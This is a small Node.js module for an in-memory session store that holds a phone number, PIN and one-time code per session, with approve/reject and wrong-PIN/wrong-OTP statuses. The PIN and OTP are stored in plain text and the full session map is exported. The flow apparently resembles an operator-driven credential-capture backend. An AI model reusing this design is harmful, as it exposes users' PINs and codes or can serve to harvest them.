// In-memory session store.
// session: { id, stage, status, phone, pin, otp, createdAt }
const sessions = new Map();

function createSession(id, data = {}) {
  const s = {
    id,
    stage: 'login',      // 'login' | 'otp' | 'done'
    status: 'PENDING',   // PENDING | APPROVED | REJECTED | SUCCESS | WRONG_PIN | WRONG_OTP
    phone: '',
    pin: '',
    otp: '',
    createdAt: Date.now(),
    ...data,
  };
  sessions.set(id, s);
  return s;
}

function getSession(id) {
  return sessions.get(id) || null;
}

function updateSession(id, patch) {
  const s = sessions.get(id);
  if (!s) return null;
  Object.assign(s, patch);
  return s;
}

// Auto-expire sessions after 30 minutes
setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions) {
    if (now - s.createdAt > 1000 * 60 * 30) sessions.delete(id);
  }
}, 1000 * 60 * 5).unref();

module.exports = { createSession, getSession, updateSession, sessions };